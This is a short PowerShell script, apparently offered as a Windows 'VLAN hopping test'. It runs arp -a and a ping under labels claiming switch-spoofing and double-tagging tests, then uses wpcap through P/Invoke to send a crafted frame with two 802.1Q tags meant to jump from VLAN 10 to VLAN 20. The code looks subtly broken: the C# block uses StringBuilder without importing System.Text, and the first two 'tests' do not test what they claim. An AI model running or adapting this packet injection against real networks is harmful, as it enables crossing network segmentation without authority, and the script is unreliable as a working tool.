#########################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#########################################################################################################################################################################################################################


Write-Host "Running VLAN hopping test on Windows..."

# Switch Spoofing Test
Write-Host "Switch Spoofing Test:"
arp -a

# Double Tagging Test
Write-Host "Double Tagging Test:"
Test-Connection -Source "192.168.10.1" -Count 4

# Exploitation (with permission)
Write-Host "Exploitation Example:"
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class PInvoke {
    [DllImport("wpcap.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern IntPtr pcap_open_live(string dev, int snaplen, int promisc, int to_ms, StringBuilder errbuf);
    [DllImport("wpcap.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern int pcap_sendpacket(IntPtr p, byte[] packet, int size);
}
"@
$packet = [byte[]]@(0x00,0x11,0x22,0x33,0x44,0x55,0x00,0x11,0x22,0x33,0x44,0x55,0x81,0x00,0x00,0x0A,0x81,0x00,0x00,0x14,0x08,0x00,0x45,0x00,0x00,0x1c,0x00,0x01,0x00,0x00,0x40,0x01,0xf7,0xbc,0xc0,0xa8,0x0A,0x01,0xc0,0xa8,0x14,0x02,0x08,0x00,0x4d,0x22,0x00,0x01,0x00,0x01)
$errbuf = New-Object System.Text.StringBuilder
$handle = [PInvoke]::pcap_open_live("Ethernet0", 65536, 1, 1000, $errbuf)
[PInvoke]::pcap_sendpacket($handle, $packet, $packet.Length)
Write-Host "Exploitation packet sent"

